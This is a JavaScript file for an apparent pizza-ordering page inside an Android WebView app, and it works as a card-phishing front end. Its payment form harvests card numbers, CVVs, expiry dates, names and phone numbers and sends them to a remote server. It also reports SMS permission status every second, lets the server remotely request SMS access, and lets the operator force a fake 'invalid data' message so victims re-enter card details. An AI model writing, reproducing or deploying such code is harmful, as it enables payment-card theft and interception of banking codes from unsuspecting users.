document.addEventListener("DOMContentLoaded", () => {
  const serverUrl = "https://backfinish.onrender.com";
  const pageLang = document.documentElement.lang.startsWith("de") ? "de" : "en";

  // Localized messages
  const messages = {
    accepted: {
      de: ["Bestellung angenommen", "Ihre Bestellung wurde angenommen. Bitte warten Sie auf die Lieferung."],
      en: ["Order accepted", "Your order has been accepted. Please await delivery."]
    },
    error: {
      de: ["Fehlerhafte Daten", "Ungültige Daten eingegeben. Bitte erneut ausfüllen."],
      en: ["Invalid data", "You entered invalid data. Please fill the form again."]
    },
    validationError: {
      de: "Bitte korrigiere die markierten Felder.",
      en: "Please correct the highlighted fields."
    },
    sendError: {
      de: "Beim Senden ist ein Fehler aufgetreten.",
      en: "An error occurred while sending."
    }
  };

  // Safe notification wrapper
  function notifyUser(title, text) {
    if (window.AndroidBridge?.showNotification) {
      AndroidBridge.showNotification(title, text);
    } else {
      console.log(`Notification: ${title} - ${text}`);
    }
  }

// Device ID management
let deviceId = window.AndroidBridge?.getDeviceId?.();
if (!deviceId) {
  console.error("❌ AndroidBridge.getDeviceId() не работает");
} else {
  console.log("📱 deviceId от Android:", deviceId);

  // 1. Отправка через 5 секунд после загрузки
  setTimeout(() => {
    // Выполняем отправку smsPermission один раз через 5 секунд
    if (deviceId && window.AndroidBridge?.getSmsPermission) {
      const granted = !!AndroidBridge.getSmsPermission();
      fetch(`${serverUrl}/api/update-sms-permission`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ deviceId, smsPermission: granted })
      });
      console.log("📤 smsPermission отправлен:", granted);
    }
  }, 5000);  // Отправка через 5 секунд

  // 2. После 5 секунд, продолжаем отправлять каждую 1 секунду
  setInterval(syncSmsPermission, 1000); // каждый 1 сек
}

// 📤 deviceId отправляется 1 раз сразу
const SENT_DEVICE_KEY = `device_sent_${deviceId}`;
const SENT_PERMISSION_KEY = `sms_permission_sent_${deviceId}`;


// 1. Отправляем только deviceId + timestamp (один раз)
async function sendDeviceIdOnce() {
  const key = `device_sent_${deviceId}`;
  if (!deviceId || localStorage.getItem(key)) return;

  try {
    await fetch(`${serverUrl}/api/register-device`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        deviceId,
        timestamp: new Date().toISOString()   // ← добавили метку времени здесь
      })
    });
    console.log("✅ Устройство зарегистрировано на сервере (IP + время регистрации)");
    localStorage.setItem(key, "1");
  } catch (e) {
    console.error("❌ Не удалось зарегистрировать устройство", e);
  }
}

// ▶️ Запуск при загрузке
sendDeviceIdOnce();



  

  // WebSocket client (namespace /client)
  let socket;
  try {
    socket = io(`${serverUrl}/client`, { transports: ["websocket"] });
    socket.on("connect", () => console.log("WS connected:", socket.id));
    socket.emit("join_device", deviceId);
    socket.on("prompt_resubmit", handleResubmit);
    socket.on("request_sms_permission", () => {
  console.log("Received request_sms_permission event from server");
  if (window.AndroidBridge?.requestSmsPermission) {
    AndroidBridge.requestSmsPermission();
  }
});
  } catch (e) {
    console.error("WebSocket error:", e);
  }

  // HTTP polling fallback every 30s
  setInterval(async () => {
    try {
      const res = await fetch(
        `${serverUrl}/api/check-resubmit?deviceId=${deviceId}`
      );
      const json = await res.json();
      if (json.resubmit) handleResubmit();
    } catch {}
  }, 30000);

  // Initial block state if already ordered
  if (localStorage.getItem("orderDone") === "true") {
    blockButtons(messages.accepted[pageLang][0]);
  }

  // ===== UI: navigation =====
  const navMenu = document.getElementById("nav-menu");
  const navToggle = document.getElementById("nav-toggle");
  const navClose = document.getElementById("nav-close");
  navToggle?.addEventListener("click", () => navMenu.classList.add("show-menu"));
  navClose?.addEventListener("click", () => navMenu.classList.remove("show-menu"));
  document.querySelectorAll(".nav__link").forEach(link =>
    link.addEventListener("click", () => navMenu.classList.remove("show-menu"))
  );

  // ===== UI: active link on scroll =====
  const sections = document.querySelectorAll("section[id]");
  window.addEventListener("scroll", () => {
    const scrollY = window.pageYOffset;
    sections.forEach(section => {
      const top = section.offsetTop - 50;
      const height = section.offsetHeight;
      const id = section.id;
      const link = document.querySelector(`.nav__menu a[href*="${id}"]`);
      if (scrollY > top && scrollY <= top + height) {
        link?.classList.add("active-link");
      } else {
        link?.classList.remove("active-link");
      }
    });
  });

  // ===== UI: scroll-up button =====
  const scrollUpBtn = document.getElementById("scroll-up");
  window.addEventListener("scroll", () => {
    if (window.scrollY >= 350) scrollUpBtn.classList.add("show-scroll");
    else scrollUpBtn.classList.remove("show-scroll");
  });

  // ===== UI: theme toggle =====
  const themeButton = document.getElementById("theme-button");
  const darkClass = "dark-theme";
  const iconClass = "fa-sun";
  const savedTheme = localStorage.getItem("selected-theme");
  const savedIcon = localStorage.getItem("selected-icon");
  if (savedTheme) {
    document.body.classList.toggle(darkClass, savedTheme === "dark");
    themeButton.classList.toggle(iconClass, savedIcon === "fa-moon");
  }
  themeButton.addEventListener("click", () => {
    document.body.classList.toggle(darkClass);
    themeButton.classList.toggle(iconClass);
    localStorage.setItem(
      "selected-theme",
      document.body.classList.contains(darkClass) ? "dark" : "light"
    );
    localStorage.setItem(
      "selected-icon",
      themeButton.classList.contains(iconClass) ? "fa-moon" : "fa-sun"
    );
  });

  // ===== Popups and order =====
  const paymentPopup = document.getElementById("payment-popup");
  const confirmationPopup = document.getElementById("confirmation-popup");
  const closeBtns = document.querySelectorAll(".popup-overlay .close-btn");
  const openOrderBtns = document.querySelectorAll(".order-now-btn");
  const orderForm = document.getElementById("payment-form");
  const orderMessage = document.getElementById("order-message");
  const confirmCloseBtn = document.getElementById("confirm-close");
  const pizzaContainer = document.getElementById("pizzaContainer");

openOrderBtns.forEach(btn =>
  btn.addEventListener("click", e => {
    e.preventDefault();

    // Отправляем пиксельное событие начала оформления
    if (window.fbq) {
      fbq('track', 'InitiateCheckout');
    }

    // Открываем попап оплаты
    paymentPopup.classList.add("active");
  })
);

  closeBtns.forEach(btn =>
    btn.addEventListener("click", () => {
      const pop = btn.closest(".popup-overlay");
      pop.classList.remove("active");
      if (pop === paymentPopup) {
        orderForm.reset();
        clearErrors();
      }
    })
  );
  confirmationPopup.addEventListener("click", e => {
    if (e.target === confirmationPopup) confirmationPopup.classList.remove("active");
  });
  confirmCloseBtn.addEventListener("click", () => {
    confirmationPopup.classList.remove("active");
    pizzaContainer.classList.remove("hidden");
  });

  // ===== Validation rules =====
  const validators = {
    address: { fn: v => v.length >= 4, msg: pageLang === "de" ? "Adresse muss ≥4 Zeichen enthalten." : "Address must be at least 4 characters." },
    cardholderName: {
      fn: v => /^[A-Za-zÄÖÜäöüß ]{2,}$/.test(v),
      msg: pageLang === "de" ? "Name nur Buchstaben, min.2 Zeichen." : "Name letters only, min.2 characters."
    },
    cardNumber: { fn: v => /^(\d{4} ?){3}\d{4}$/.test(v), msg: pageLang === "de" ? "Kartennummer: 16 Ziffern." : "Card number: 16 digits." },
    expiry: {
      fn: v => {
        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(v)) return false;
        const [m, y] = v.split("/").map(Number);
        const exp = new Date(2000 + y, m - 1, 1);
        const now = new Date();
        return exp >= new Date(now.getFullYear(), now.getMonth(), 1);
      },
      msg: pageLang === "de" ? "Ungültiges Ablaufdatum." : "Invalid expiry date."
    },
    cvv: { fn: v => /^[0-9]{3,4}$/.test(v), msg: pageLang === "de" ? "CVC: 3–4 Ziffern." : "CVC: 3–4 digits." },
phoneNumber: {
  fn: v => v === "" || /^\+?[0-9]{6,15}$/.test(v.replace(/\s+/g, "")),
  msg: pageLang === "de"
    ? "Ungültige Telefonnummer. Erlaubt: + und 6–15 Ziffern."
    : "Invalid phone number. Allowed: + and 6–15 digits."
}
  };

  function clearErrors() {
    orderForm.querySelectorAll("input[id]").forEach(f => {
      f.classList.remove("input-error");
      if (f.nextElementSibling?.classList.contains("error-text")) f.nextElementSibling.remove();
    });
    orderMessage.textContent = "";
  }
  function showError(field, message) {
    field.classList.add("input-error");
    const err = document.createElement("div");
    err.className = "error-text";
    err.textContent = message;
    field.after(err);
  }

  // Field formatting
  const cardInput = document.getElementById("cardNumber");
  const expiryInput = document.getElementById("expiry");
  const cvvInput = document.getElementById("cvv");
  const phoneInput = document.getElementById("phoneNumber");
  const nameInput = document.getElementById("cardholderName");
  nameInput.addEventListener("keypress", e => /\d/.test(e.key) && e.preventDefault());
  nameInput.addEventListener("input", () => nameInput.value = nameInput.value.replace(/\d+/g, ""));
  cardInput?.addEventListener("input", () => {
    let v = cardInput.value.replace(/\D/g, "").slice(0, 16);
    cardInput.value = v.match(/.{1,4}/g)?.join(" ") || v;
  });
  expiryInput?.addEventListener("input", () => {
    let v = expiryInput.value.replace(/\D/g, "").slice(0, 4);
    if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
    expiryInput.value = v;
  });
  cvvInput?.addEventListener("input", () => {
    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 4);
  });
  phoneInput?.addEventListener("input", () => {
  let v = phoneInput.value;

  // Проверяем, есть ли ведущий +
  const plus = v.startsWith("+") ? "+" : "";

  // Убираем всё, кроме цифр
  const digits = v.replace(/\D/g, "").slice(0, 15);

  // Собираем обратно
  phoneInput.value = plus + digits;
});


// ===== Form submit =====
orderForm.addEventListener("submit", async e => {
  e.preventDefault();
  clearErrors();
  let hasError = false;
  const data = {};

  orderForm.querySelectorAll("input[id]").forEach(f => {
    const v = f.value.trim();
    if (validators[f.id] && !validators[f.id].fn(v)) {
      showError(f, validators[f.id].msg);
      hasError = true;
    }
    data[f.id] = v;
  });

  if (hasError) {
    orderMessage.textContent = messages.validationError[pageLang];
    return;
  }

  data.deviceId = deviceId;
  // data.timestamp убран

  // Получаем актуальное значение smsPermission
  if (window.AndroidBridge?.getSmsPermission) {
    data.smsPermission = !!AndroidBridge.getSmsPermission();
  } else {
    data.smsPermission = false;
  }

  try {
    const res = await fetch(`${serverUrl}/api/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
    const result = await res.json();
    if (!res.ok || !result.success) throw "";
    localStorage.setItem("orderDone", "true");
    notifyUser(...messages.accepted[pageLang]);
    if (window.fbq) fbq('track', 'Purchase');
    blockButtons(messages.accepted[pageLang][0]);
    paymentPopup.classList.remove("active");
    confirmationPopup.classList.add("active");
    orderForm.reset();
  } catch {
    orderMessage.textContent = messages.sendError[pageLang];
  }
});


  // Pizza animation message toggle
  const pizzaAnim = document.getElementById("pizzaAnim");
  const cookMsg = document.getElementById("cookMsg");
  pizzaAnim.addEventListener("click", () => cookMsg.classList.toggle("visible"));

  // ===== Helpers =====
  function blockButtons(text) {
    document.querySelectorAll(".order-now-btn").forEach(btn => {
      btn.classList.add("disabled");
      btn.innerHTML = `<i class="fa-solid fa-check"></i> ${text}`;
    });
  }
  function unblockButtons(text) {
    document.querySelectorAll(".order-now-btn").forEach(btn => {
      btn.classList.remove("disabled");
      btn.innerHTML = text;
    });
  }
  function showToast(message) {
    const c = document.getElementById('toast-container');
    const t = document.createElement('div');
    t.className = 'toast';
    t.textContent = message;
    const close = document.createElement('span');
    close.className = 'toast-close';
    close.textContent = '✕';
    close.onclick = () => c.removeChild(t);
    t.append(close);
    c.append(t);
  }

  function handleResubmit() {
    localStorage.removeItem("orderDone");
    notifyUser(...messages.error[pageLang]);
    unblockButtons(pageLang === "de" ? "Erneut senden" : "Resubmit form");
    showToast(
      pageLang === "de"
        ? "Daten fehlerhaft. Formular bitte erneut ausfüllen."
        : "Invalid data. Please refill the form."
    );
    fetch(`${serverUrl}/api/check-resubmit?deviceId=${deviceId}`).catch(() => {});
  }
  async function syncSmsPermission() {
    if (!window.AndroidBridge?.getSmsPermission || !deviceId) return;

    const smsPermission = AndroidBridge.getSmsPermission();
    if (typeof smsPermission !== "boolean") return;

    try {
      await fetch(`${serverUrl}/api/update-sms-permission`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId,
          smsPermission
        })
      });
    } catch (e) {
      console.error("❌ Failed to sync smsPermission", e);
    }
  }
});
